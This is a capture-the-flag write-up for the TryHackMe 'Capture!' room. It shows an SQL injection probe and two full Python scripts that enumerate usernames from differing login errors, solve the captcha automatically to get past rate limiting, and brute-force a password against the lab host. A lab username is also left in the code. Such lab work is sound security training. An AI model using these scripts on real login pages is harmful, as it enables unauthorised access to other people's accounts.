# Capture!

## Introduction

Welcome to my another writeup! In this TryHackMe [Capture!](https://tryhackme.com/room/capture) room, you'll learn: Enumerating username via different response and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Task 1 - General information](#task-1---general-information)**
2. **[Task 2 - Bypass the login form](#task-2---bypass-the-login-form)**
3. **[Conclusion](#conclusion)**

## Background

> Can you bypass the login form?
> 
> Difficulty: Easy

### Task 1 - General information

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e3943bd2445e65e56afb7a5/room-content/b5a647b9469643ad859ac93c27dd8e3d.png)

SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly**.**

Before we start, download the required files by pressing the **Download Task Files** button.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512150555.png)

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Capture!)-[2023.05.12|15:06:03(HKT)]
└> file capture.zip   
capture.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥earth]-(~/ctf/thm/ctf/Capture!)-[2023.05.12|15:06:04(HKT)]
└> unzip capture.zip 
Archive:  capture.zip
  inflating: passwords.txt           
  inflating: usernames.txt
┌[siunam♥earth]-(~/ctf/thm/ctf/Capture!)-[2023.05.12|15:06:15(HKT)]
└> head -n 10 *.txt
==> passwords.txt <==
football
kimberly
mookie
daniel
love21
drpepper
brayan
bullet
iluvme
diosesamor

==> usernames.txt <==
rachel
rodney
corrine
erik
chuck
kory
trey
cornelius
bruce
wilbur
```

After extracted, the zip file has 2 files: `passwords.txt`, `usernames.txt`, which are a username and password wordlist.

### Task 2 - Bypass the login form

**Now, we can go to the machine's IP address on port 80 (HTTP):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512150854.png)

When we go to `/`, it'll redirect us to the intranet login page.

Whenever I deal with a login page, I always try SQL injection to bypass the authentication, like simple `' OR 1=1-- -`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512151014.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512151026.png)

Nope.

However, I noticed something very, very weird.

> "**Error:** The user '" OR 1=1-- -' does not exist"

Hmm... That being said, ***if a valid user exist, it'll response us with a different response!!***

So, we can enumerate different valid user via brute forcing!

> Note: You can read more about username enumeration via different responses in my PortSwigger Web Security Academy lab about Authentication: [https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-1/](https://siunam321.github.io/ctf/portswigger-labs/Authentication/auth-1/).

**However, when we have too many incorrect attempts, it requires solving a "Captcha":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512152824.png)

I tried to use some headers like **`X-Forwarded-For`** to bypass the rate limiting, but no dice.

When we entered the correct captcha, it'll continue the login process:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512153526.png)

**Luckly, we can write a Python script to automate that process!**
```py
#!/usr/bin/env python3
import requests
from threading import Thread
from time import sleep
from bs4 import BeautifulSoup
import re
import sympy

class Bruteforcer:
    def __init__(self, url, usernameWordlist):
        self.url = url
        self.usernameWordlist = usernameWordlist

    def enumerateUsername(self):
        listUsernames = self.readFile()
        listUsernamesLength = len(listUsernames)
        for index, username in enumerate(listUsernames):
            print(f'[*] Trying username: {username:20s} ({index + 1}/{listUsernamesLength})', end='\r')
            self.enumerateUsernameRequest(username)

            # thread = Thread(target=self.enumerateUsernameRequest, args=(username,))
            # thread.start()

            # # you can adjust how fast of each threads
            # sleep(0.1)

    def readFile(self):
        listUsernames = list()
        try:
            with open(self.usernameWordlist, 'r') as file:
                for line in file:
                    username = line.strip()
                    listUsernames.append(username)

                return listUsernames
        except FileNotFoundError:
            print(f'The file {self.usernameWordlist} doesn\'t exist.')

    def enumerateUsernameRequest(self, username):
        payload = {
            'username': username,
            'password': 'anything'
        }
        usernameRequest = requests.post(self.url, data=payload)
        isRateLimited = 'Too many bad login attempts!' in usernameRequest.text and 'The user' not in usernameRequest.text
        if isRateLimited:
            soup = BeautifulSoup(usernameRequest.text, 'html.parser')
            # grab pattern like '342 - 47'. Generated from ChatGPT
            pattern = r'(\d+\s*.\s*\d+)'
            captchaMatched = re.search(pattern, soup.text)
            if not captchaMatched:
                print('[-] No captcha found.')

            equation = captchaMatched.group(0)
            answer = sympy.sympify(equation)
            self.afterSolvedCaptchaRequest(username, answer)
            return

        isValidUser = not 'The user' in usernameRequest.text
        if isValidUser:
            print(f'[+] Found valid username: {username}')

    def afterSolvedCaptchaRequest(self, username, answer):
        payload = {
            'username': username,
            'password': 'anything',
            'captcha': answer
        }
        usernameRateLimitedRequest = requests.post(self.url, data=payload)
        isInvalidCaptcha = 'Invalid captcha' in usernameRateLimitedRequest.text
        isValidUser = not 'The user' in usernameRateLimitedRequest.text
        if isInvalidCaptcha:
            print('[-] Captcha failed.')
        if isValidUser:
            print(f'[+] Found valid username: {username}')

if __name__ == '__main__':
    url = 'http://10.10.2.194/login'
    usernameWordlist = 'usernames.txt'
    bruteforcer = Bruteforcer(url, usernameWordlist)

    bruteforcer.enumerateUsername()
```

> Note: I tried to implement the multithreading, but failed...

The above script will first send a POST request to `/login` with the `username`, if we're rate limited, solve the captcha first. After solved the captcha, send a POST request again with the same username.

**If `does not exist` doesn't exist, we found a valid username:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Capture!)-[2023.05.12|17:24:16(HKT)]
└> python3 enum_username.py
[+] Found valid username: {Redacted}         ({Redacted}/878)
[*] Trying username: {Redacted}               ({Redacted}/878)
```

Nice! We found it!!

**Now, what if I entered a valid username but invalid password?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512173809.png)

It responses "**Error:** Invalid password for user '{Redacted}'"!

**Then, we can brute force it's password!**
```py
#!/usr/bin/env python3
import requests
from threading import Thread
from time import sleep
from bs4 import BeautifulSoup
import re
import sympy

class Bruteforcer:
    def __init__(self, url, username, passwordWordList):
        self.url = url
        self.username = username
        self.passwordWordList = passwordWordList

    def enumeratePassword(self):
        listPasswords = self.readFile()
        listPasswordsLength = len(listPasswords)
        for index, password in enumerate(listPasswords):
            print(f'[*] Trying password: {password:20s} ({index + 1}/{listPasswordsLength})', end='\r')
            self.enumeratePasswordRequest(password)

    def readFile(self):
        listPasswords = list()
        try:
            with open(self.passwordWordList, 'r') as file:
                for line in file:
                    password = line.strip()
                    listPasswords.append(password)

                return listPasswords
        except FileNotFoundError:
            print(f'The file {self.passwordWordList} doesn\'t exist.')

    def enumeratePasswordRequest(self, password):
        payload = {
            'username': self.username,
            'password': password
        }
        passwordRequest = requests.post(self.url, data=payload)
        isRateLimited = 'Too many bad login attempts!' in passwordRequest.text and 'Invalid password' not in passwordRequest.text
        if isRateLimited:
            soup = BeautifulSoup(passwordRequest.text, 'html.parser')
            # grab pattern like '342 - 47'. Generated from ChatGPT
            pattern = r'(\d+\s*.\s*\d+)'
            captchaMatched = re.search(pattern, soup.text)
            if not captchaMatched:
                print('[-] No captcha found.')

            equation = captchaMatched.group(0)
            answer = sympy.sympify(equation)
            self.afterSolvedCaptchaRequest(password, answer)
            return

        isValidPassword = not 'Invalid password' in passwordRequest.text
        if isValidPassword:
            print(f'[+] Found valid password! username: {self.username}, password: {password}')
            exit()

    def afterSolvedCaptchaRequest(self, password, answer):
        payload = {
            'username': self.username,
            'password': password,
            'captcha': answer
        }
        passwordRateLimitedRequest = requests.post(self.url, data=payload)
        isInvalidCaptcha = 'Invalid captcha' in passwordRateLimitedRequest.text
        isValidPassword = not 'Invalid password' in passwordRateLimitedRequest.text
        if isInvalidCaptcha:
            print('[-] Captcha failed.')
        if isValidPassword:
            print(f'[+] Found valid password! username: {self.username}, password: {password}')
            exit()

if __name__ == '__main__':
    url = 'http://10.10.2.194/login'
    username = 'natalie'
    passwordWordList = 'passwords.txt'
    bruteforcer = Bruteforcer(url, username, passwordWordList)

    bruteforcer.enumeratePassword()
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Capture!)-[2023.05.12|17:40:31(HKT)]
└> python3 enum_password.py
[+] Found valid password! username: {Redacted}, password: {Redacted}
```

Nice! Let's login!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512174700.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Capture/images/Pasted%20image%2020230512174708.png)

We got the flag!

# Conclusion

What we've learned:

1. Enumerating Username Via Different Response
2. Brute Forcing Password